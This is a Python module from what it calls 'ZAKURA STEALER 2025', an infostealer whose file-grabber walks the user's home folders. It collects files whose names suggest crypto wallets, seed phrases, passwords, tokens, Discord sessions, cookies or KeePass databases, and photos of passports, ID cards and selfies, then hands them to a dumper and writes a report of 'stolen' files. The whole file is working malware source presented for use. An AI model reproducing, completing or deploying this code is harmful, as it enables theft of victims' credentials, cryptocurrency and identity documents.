# files.py – ZAKURA STEALER 2025 – FILE GRABBER INTELLIGENT
import os
from pathlib import Path

# ===================================================================
# CONFIG
# ===================================================================
MAX_FILE_SIZE = 3 * 1024 * 1024

CRITICAL_EXT = {
    ".txt", ".json", ".log", ".db", ".sqlite", ".wallet", ".dat", ".bak",
    ".csv", ".kdbx", ".xml", ".env", ".yml", ".yaml", ".conf", ".config," ".jpg"
}

PHOTO_EXT = {".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp", ".heic", ".tiff"}

CRITICAL_KEYWORDS = [
    "seed", "mnemonic", "phrase", "recovery", "backup", "privatekey", "keystore",
    "wallet", "metamask", "phantom", "exodus", "trust", "atomic", "coinbase",
    "binance", "ledger", "trezor", "electrum", "2fa", "authy", "password",
    "token", "discord", "session", "cookie", "localstorage", "leveldb", "cv"
]

PHOTO_KEYWORDS = [
    "id", "passport", "passeport", "permis", "license", "driver", "selfie",
    "face", "visage", "kyc", "cin", "cni", "proof", "document", "scan", "identity"
]

# Dossiers à scanner (seulement des Path valides)
PRIORITY_PATHS = [
    Path.home() / "Desktop",
    Path.home() / "Downloads",
    Path.home() / "Documents",
    Path.home() / "Pictures",
    Path.home() / "OneDrive",
    Path.home() / "Bureau",           # Français
    Path.home() / "Téléchargements",
    Path.home() / "Images",
]

# ===================================================================
# FONCTIONS DE DÉTECTION
# ===================================================================
def is_critical_file(p: Path) -> bool:
    if p.suffix.lower() not in CRITICAL_EXT:
        return False
    if p.stat().st_size > MAX_FILE_SIZE:
        return False
    return any(kw in p.name.lower() for kw in CRITICAL_KEYWORDS)

def is_sensitive_photo(p: Path) -> bool:
    if p.suffix.lower() not in PHOTO_EXT:
        return False
    if p.stat().st_size > MAX_FILE_SIZE:
        return False
    return any(kw in p.name.lower() for kw in PHOTO_KEYWORDS)

# ===================================================================
# GRABBER PRINCIPAL
# ===================================================================
def steal_files(dumper):
    grabbed = 0

    for base in PRIORITY_PATHS:
        # Filtre les chemins invalides (ex: Desktop in [...] donnait un bool)
        if not isinstance(base, Path) or not base.exists():
            continue

        for root, _, files in os.walk(base):
            for name in files:
                file_path = Path(root) / name

                try:
                    if file_path.stat().st_size > MAX_FILE_SIZE:
                        continue
                except:
                    continue

                if is_critical_file(file_path) or is_sensitive_photo(file_path):
                    dumper.save_stolen_file(str(file_path))
                    grabbed += 1

    if grabbed > 0:
        report = f"[FILE GRABBER]\nFichiers sensibles volés : {grabbed}\n\n" \
                 f"→ Tri automatique : Desktop • Downloads • Documents • Pictures • Others"
        dumper.save("FILE_GRABBER_REPORT.txt", report, "Files")

# Compatibilité ancienne version
steal_files_background = steal_files